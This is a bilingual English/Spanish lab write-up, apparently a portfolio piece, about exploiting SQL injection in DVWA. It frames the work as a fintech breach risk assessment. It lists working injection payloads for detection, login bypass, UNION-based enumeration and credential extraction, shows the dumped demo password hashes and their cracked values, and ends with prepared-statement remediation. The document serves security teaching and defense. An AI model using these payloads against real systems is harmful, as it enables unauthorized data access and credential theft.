# SQL Injection - Inyeccion SQL

## [ENGLISH]

# SQL Injection in Payment Interfaces: Data Breach Risk Assessment

## Executive Summary
Discovered and exploited SQL Injection vulnerability allowing unauthorized database access, credential extraction, and complete user data exposure. In a fintech environment like Clip, this vulnerability could result in massive financial data breach and million-dollar losses.

## Vulnerability Details

| Field | Value |
|-------|-------|
| Type | CWE-89: SQL Injection |
| Severity | CRITICAL (CVSS 9.8) |
| Attack Vector | Network |
| User Interaction | None |

## Technical Analysis

### Vulnerability Detection
**Location:** User ID input field

**Test payload:**
```
1'
```
**Result:** SQL syntax error - confirms vulnerability

### Authentication Bypass
**Payload:**
```
1' OR '1'='1
```
**Result:** Returns all users from database

### System Enumeration
**Database version:**
```
1' UNION SELECT null, version()#
```
**Result:** MySQL 5.x / MariaDB

**Database name:**
```
1' UNION SELECT null, database()#
```
**Result:** dvwa

### Credential Extraction
**Payload:**
```
1' UNION SELECT user, password FROM users#
```

**Extracted data:**

| User | MD5 Hash |
|------|----------|
| admin | 5f4dcc3b5aa765d61d8327deb882cf99 |
| gordonb | e99a18c428cb38d5f260853678922e03 |
| smithy | 5f4dcc3b5aa765d61d8327deb882cf99 |
| pablo | 0d107d09f5bbe40cade3de5c71e9e9b7 |
| 1337 | 8d3533d75ae2c3966d7e0d4fcc69216b |

### Hash Cracking
Using CrackStation, all hashes were cracked in less than 1 second:

| User | Password |
|------|----------|
| admin | password |
| gordonb | abc123 |
| smithy | password |
| pablo | letmein |
| 1337 | charley |

## Fintech Impact Scenario (Clip)

### Attack Chain:
1. Attacker finds SQLi in transaction query API
2. Extracts merchant database credentials
3. Accesses balances and card data
4. Performs unauthorized transfers

### Business Impact:
- Direct Financial Loss: Unauthorized transfers from merchant accounts
- Data Breach: Exposure of transaction history, customer data
- Regulatory Fines: PCI-DSS violation (Requirement 6.5.1)
- Reputation Damage: Loss of merchant trust

### Estimated Risk for 100,000 merchants:
- If 0.1% accounts compromised = 100 merchants
- Average merchant balance: $5,000 USD
- Potential loss: $500,000 USD

## Remediation

### Immediate:
```php
// Instead of:
$query = "SELECT * FROM users WHERE id = '" . $_GET['id'] . "'";

// Use prepared statements:
$stmt = $pdo->prepare("SELECT * FROM users WHERE id = ?");
$stmt->execute([$_GET['id']]);
```

### Long-term:
1. Implement prepared statements in all queries
2. Input validation with whitelist
3. Least privilege principle for database accounts
4. Web Application Firewall (WAF)
5. Regular code audits

## Tools Used
- DVWA (Damn Vulnerable Web Application)
- Burp Suite Community Edition
- CrackStation (hash cracking)
- Firefox Developer Tools

## References
- OWASP SQL Injection Prevention Cheat Sheet
- CWE-89: Improper Neutralization of Special Elements in SQL Command
- PCI-DSS Requirement 6.5.1

---

## [ESPANOL]

# Inyeccion SQL en Interfaces de Pago: Evaluacion de Riesgo de Filtracion de Datos

## Resumen Ejecutivo
Se descubrio y exploto una vulnerabilidad de Inyeccion SQL que permite acceso no autorizado a bases de datos, extraccion de credenciales y exposicion completa de datos de usuarios. En un entorno fintech como Clip, esta vulnerabilidad podria resultar en filtracion masiva de datos financieros y perdidas millonarias.

## Detalles de la Vulnerabilidad

| Campo | Valor |
|-------|-------|
| Tipo | CWE-89: Inyeccion SQL |
| Severidad | CRITICA (CVSS 9.8) |
| Vector de Ataque | Red |
| Interaccion de Usuario | Ninguna |

## Analisis Tecnico

### Deteccion de Vulnerabilidad
**Ubicacion:** Campo de entrada User ID

**Payload de prueba:**
```
1'
```
**Resultado:** Error de sintaxis SQL - confirma vulnerabilidad

### Bypass de Autenticacion
**Payload:**
```
1' OR '1'='1
```
**Resultado:** Retorna todos los usuarios de la base de datos

### Enumeracion del Sistema
**Version de base de datos:**
```
1' UNION SELECT null, version()#
```
**Resultado:** MySQL 5.x / MariaDB

**Nombre de base de datos:**
```
1' UNION SELECT null, database()#
```
**Resultado:** dvwa

### Extraccion de Credenciales
**Payload:**
```
1' UNION SELECT user, password FROM users#
```

**Datos extraidos:**

| Usuario | Hash MD5 |
|---------|----------|
| admin | 5f4dcc3b5aa765d61d8327deb882cf99 |
| gordonb | e99a18c428cb38d5f260853678922e03 |
| smithy | 5f4dcc3b5aa765d61d8327deb882cf99 |
| pablo | 0d107d09f5bbe40cade3de5c71e9e9b7 |
| 1337 | 8d3533d75ae2c3966d7e0d4fcc69216b |

### Crackeo de Hashes
Usando CrackStation, todos los hashes fueron crackeados en menos de 1 segundo:

| Usuario | Contrasena |
|---------|------------|
| admin | password |
| gordonb | abc123 |
| smithy | password |
| pablo | letmein |
| 1337 | charley |

## Escenario de Impacto Fintech (Clip)

### Cadena de Ataque:
1. Atacante encuentra SQLi en API de consulta de transacciones
2. Extrae credenciales de base de datos de comerciantes
3. Accede a balances y datos de tarjetas
4. Realiza transferencias no autorizadas

### Impacto de Negocio:
- Perdida Financiera Directa: Transferencias no autorizadas desde cuentas de comerciantes
- Filtracion de Datos: Exposicion de historial de transacciones, datos de clientes
- Multas Regulatorias: Violacion de PCI-DSS (Requisito 6.5.1)
- Dano Reputacional: Perdida de confianza de comerciantes

### Riesgo Estimado para 100,000 comerciantes:
- Si 0.1% de cuentas comprometidas = 100 comerciantes
- Balance promedio por comerciante: $5,000 USD
- Perdida potencial: $500,000 USD

## Remediacion

### Inmediata:
```php
// En lugar de:
$query = "SELECT * FROM users WHERE id = '" . $_GET['id'] . "'";

// Usar prepared statements:
$stmt = $pdo->prepare("SELECT * FROM users WHERE id = ?");
$stmt->execute([$_GET['id']]);
```

### Largo plazo:
1. Implementar prepared statements en todas las consultas
2. Validacion de entrada con whitelist
3. Principio de minimo privilegio en cuentas de base de datos
4. Web Application Firewall (WAF)
5. Auditorias de codigo regulares

## Herramientas Utilizadas
- DVWA (Damn Vulnerable Web Application)
- Burp Suite Community Edition
- CrackStation (crackeo de hashes)
- Firefox Developer Tools

## Referencias
- OWASP SQL Injection Prevention Cheat Sheet
- CWE-89: Improper Neutralization of Special Elements in SQL Command
- PCI-DSS Requisito 6.5.1

---
**Autor / Author:** Francisco Escalante
**Fecha / Date:** Enero / January 2026
**Entorno / Environment:** DVWA on Parrot OS
**GitHub:** github.com/Paxx16/cybersecurity-journey
